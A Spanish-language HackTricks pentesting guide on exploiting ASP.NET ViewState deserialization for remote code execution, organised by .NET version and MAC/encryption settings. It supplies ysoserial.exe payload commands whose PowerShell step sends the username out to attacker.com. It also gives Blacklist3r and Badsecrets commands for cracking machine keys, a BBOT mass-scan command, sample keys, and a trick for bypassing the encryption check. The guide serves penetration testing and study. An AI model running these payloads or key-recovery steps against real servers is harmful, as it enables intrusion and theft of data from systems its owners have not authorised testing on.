# Explotando \_\_VIEWSTATE sin conocer los secretos

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Consejo de bug bounty**: **reg√≠strate** en **Intigriti**, una **plataforma de bug bounty premium creada por hackers, para hackers**! √önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy, y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## ¬øQu√© es ViewState?

**ViewState** sirve como el mecanismo predeterminado en ASP.NET para mantener datos de p√°gina y control a trav√©s de p√°ginas web. Durante el renderizado del HTML de una p√°gina, el estado actual de la p√°gina y los valores que se deben preservar durante un postback se serializan en cadenas codificadas en base64. Estas cadenas se colocan en campos ocultos de ViewState.

La informaci√≥n de ViewState se puede caracterizar por las siguientes propiedades o sus combinaciones:

* **Base64**:
* Este formato se utiliza cuando tanto los atributos `EnableViewStateMac` como `ViewStateEncryptionMode` est√°n configurados como falsos.
* **Base64 + MAC (C√≥digo de Autenticaci√≥n de Mensajes) Habilitado**:
* La activaci√≥n de MAC se logra configurando el atributo `EnableViewStateMac` como verdadero. Esto proporciona verificaci√≥n de integridad para los datos de ViewState.
* **Base64 + Encriptado**:
* La encriptaci√≥n se aplica cuando el atributo `ViewStateEncryptionMode` est√° configurado como verdadero, asegurando la confidencialidad de los datos de ViewState.

## Casos de Prueba

La imagen es una tabla que detalla diferentes configuraciones para ViewState en ASP.NET seg√∫n la versi√≥n del marco .NET. Aqu√≠ hay un resumen del contenido:

1. Para **cualquier versi√≥n de .NET**, cuando tanto MAC como Encriptaci√≥n est√°n desactivados, no se requiere una MachineKey, y por lo tanto no hay un m√©todo aplicable para identificarla.
2. Para **versiones anteriores a 4.5**, si MAC est√° habilitado pero la Encriptaci√≥n no, se requiere una MachineKey. El m√©todo para identificar la MachineKey se denomina "Blacklist3r."
3. Para **versiones anteriores a 4.5**, independientemente de si MAC est√° habilitado o deshabilitado, si la Encriptaci√≥n est√° habilitada, se necesita una MachineKey. Identificar la MachineKey es una tarea para "Blacklist3r - Desarrollo Futuro."
4. Para **versiones 4.5 y superiores**, todas las combinaciones de MAC y Encriptaci√≥n (ya sea que ambas sean verdaderas, o una sea verdadera y la otra falsa) requieren una MachineKey. La MachineKey se puede identificar usando "Blacklist3r."

### Caso de Prueba: 1 ‚Äì EnableViewStateMac=false y viewStateEncryptionMode=false

Tambi√©n es posible deshabilitar completamente el ViewStateMAC configurando la clave del registro `AspNetEnforceViewStateMac` a cero en:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Identificando Atributos de ViewState**

Puedes intentar identificar si ViewState est√° protegido por MAC capturando una solicitud que contenga este par√°metro con BurpSuite. Si no se utiliza Mac para proteger el par√°metro, puedes explotarlo usando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test case 1.5 ‚Äì Like Test case 1 but the ViewState cookie isn't sent by the server

Los desarrolladores pueden **eliminar ViewState** de convertirse en parte de una solicitud HTTP (el usuario no recibir√° esta cookie).\
Se puede suponer que si **ViewState** **no est√° presente**, su implementaci√≥n es **segura** de cualquier vulnerabilidad potencial que surja con la deserializaci√≥n de ViewState.\
Sin embargo, ese no es el caso. Si **agregamos el par√°metro ViewState** al cuerpo de la solicitud y enviamos nuestra carga √∫til serializada creada con ysoserial, a√∫n podremos lograr **ejecuci√≥n de c√≥digo** como se muestra en **Caso 1**.

### Test Case: 2 ‚Äì .Net < 4.5 and EnableViewStateMac=true & ViewStateEncryptionMode=false

Para **habilitar ViewState MAC** para una **p√°gina espec√≠fica**, necesitamos hacer los siguientes cambios en un archivo aspx espec√≠fico:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
Podemos hacerlo tambi√©n para la **aplicaci√≥n** **general** configur√°ndolo en el archivo **web.config** como se muestra a continuaci√≥n:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Como el par√°metro est√° protegido por MAC, esta vez para ejecutar el ataque con √©xito primero necesitamos la clave utilizada.

Puedes intentar usar [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) para encontrar la clave utilizada.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) es otra herramienta que puede identificar machineKeys conocidos. Est√° escrita en Python, por lo que, a diferencia de Blacklist3r, no hay dependencia de Windows. Para viewstates de .NET, hay una utilidad "python blacklist3r", que es la forma m√°s r√°pida de usarla.

Se puede proporcionar directamente con el viewstate y el generador:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

O, puede conectarse directamente a la URL objetivo e intentar extraer el viewstate del HTML:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Para buscar viewstates vulnerables a gran escala, en conjunto con la enumeraci√≥n de subdominios, se puede utilizar el m√≥dulo `badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md):
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

Si tienes suerte y se encuentra la clave, puedes proceder con el ataque utilizando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
En los casos donde el par√°metro `_VIEWSTATEGENERATOR` **no es enviado** por el servidor, **no** necesitas **proporcionar** el par√°metro `--generator` **sino estos**:
```bash
--apppath="/" --path="/hello.aspx"
```
### Caso de prueba: 3 ‚Äì .Net < 4.5 y EnableViewStateMac=true/false y ViewStateEncryptionMode=true

En este caso no se sabe si el par√°metro est√° protegido con MAC. Entonces, el valor probablemente est√° cifrado y **necesitar√°s la clave de m√°quina para cifrar tu carga √∫til** para explotar la vulnerabilidad.

**En este caso, el** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **m√≥dulo est√° en desarrollo...**

**Antes de .NET 4.5**, ASP.NET puede **aceptar** un par√°metro \_`__VIEWSTATE`\_ **sin cifrar** de los usuarios **incluso** si **`ViewStateEncryptionMode`** ha sido configurado a _**Siempre**_. ASP.NET **solo verifica** la **presencia** del par√°metro **`__VIEWSTATEENCRYPTED`** en la solicitud. **Si se elimina este par√°metro y se env√≠a la carga √∫til sin cifrar, a√∫n ser√° procesada.**

Por lo tanto, si los atacantes encuentran una manera de obtener la clave de m√°quina a trav√©s de otra vulnerabilidad como la exploraci√≥n de archivos, el comando de [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) utilizado en el **Caso 2**, puede ser usado para realizar RCE utilizando la vulnerabilidad de deserializaci√≥n de ViewState.

* Elimina el par√°metro `__VIEWSTATEENCRYPTED` de la solicitud para explotar la vulnerabilidad de deserializaci√≥n de ViewState, de lo contrario, devolver√° un error de validaci√≥n de MAC de ViewState y la explotaci√≥n fallar√°.

### Caso de prueba: 4 ‚Äì .Net >= 4.5 y EnableViewStateMac=true/false y ViewStateEncryptionMode=true/false excepto ambos atributos a false

Podemos forzar el uso del marco ASP.NET especificando el siguiente par√°metro dentro del archivo web.config como se muestra a continuaci√≥n.
```xml
<httpRuntime targetFramework="4.5" />
```
Alternativamente, esto se puede hacer especificando la opci√≥n a continuaci√≥n dentro del par√°metro `machineKey` del archivo web.config.
```bash
compatibilityMode="Framework45"
```
Como en el anterior, el **valor est√° encriptado.** Entonces, para enviar una **carga √∫til v√°lida, el atacante necesita la clave**.

Puedes intentar usar [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) para encontrar la clave que se est√° utilizando:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Para una descripci√≥n m√°s detallada de IISDirPath y TargetPagePath [refi√©rase aqu√≠](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

O, con [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (con un valor de generador):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

Una vez que se identifica una clave de m√°quina v√°lida, **el siguiente paso es generar una carga √∫til serializada utilizando** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
Si tienes el valor de `__VIEWSTATEGENERATOR`, puedes intentar **usar** el par√°metro `--generator` con ese valor y **omitir** los par√°metros `--path` y `--apppath`.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

Una explotaci√≥n exitosa de la vulnerabilidad de deserializaci√≥n de ViewState llevar√° a una solicitud fuera de banda a un servidor controlado por el atacante, que incluye el nombre de usuario. Este tipo de exploit se demuestra en un proof of concept (PoC) que se puede encontrar a trav√©s de un recurso titulado "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET". Para m√°s detalles sobre c√≥mo funciona el proceso de explotaci√≥n y c√≥mo utilizar herramientas como Blacklist3r para identificar el MachineKey, puedes revisar el [PoC de Explotaci√≥n Exitosa](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC).

### Caso de Prueba 6 ‚Äì ViewStateUserKeys est√° siendo utilizado

La propiedad **ViewStateUserKey** puede ser utilizada para **defenderse** contra un **ataque CSRF**. Si tal clave ha sido definida en la aplicaci√≥n y tratamos de generar la carga √∫til de **ViewState** con los m√©todos discutidos hasta ahora, la **carga √∫til no ser√° procesada por la aplicaci√≥n**.\
Necesitas usar un par√°metro m√°s para crear correctamente la carga √∫til:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Resultado de una Explotaci√≥n Exitosa <a href="#poc" id="poc"></a>

Para todos los casos de prueba, si la carga √∫til de ViewState YSoSerial.Net funciona **exitosamente**, entonces el servidor responde con ‚Äú**500 Internal server error**‚Äù teniendo como contenido de respuesta ‚Äú**La informaci√≥n del estado no es v√°lida para esta p√°gina y podr√≠a estar corrupta**‚Äù y obtenemos la solicitud OOB.

Consulta [m√°s informaci√≥n aqu√≠](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/\[\*\*https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\*\*]\(https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\)/README.md)

## Referencias

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Consejo de bug bounty**: **reg√≠strate** en **Intigriti**, una **plataforma de bug bounty premium creada por hackers, para hackers**! √önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy, y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Consulta los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
